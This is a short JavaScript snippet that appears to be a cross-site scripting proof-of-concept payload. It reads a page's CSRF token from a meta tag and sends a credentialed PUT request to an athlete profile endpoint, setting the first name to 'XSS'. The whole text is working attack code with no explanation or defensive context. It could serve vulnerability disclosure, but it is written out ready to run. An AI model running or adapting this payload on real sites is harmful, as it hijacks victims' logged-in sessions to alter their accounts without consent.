t = document.querySelector('meta[name="csrf-token"]').content;
x = new XMLHttpRequest;
x.open("PUT", "/athletes/128798963", 1);
x.withCredentials = 1;
x.setRequestHeader("X-Csrf-Token", t);
x.setRequestHeader("Content-Type", "application/json");
x.send(JSON.stringify({ athlete: { firstname: "XSS" } }));
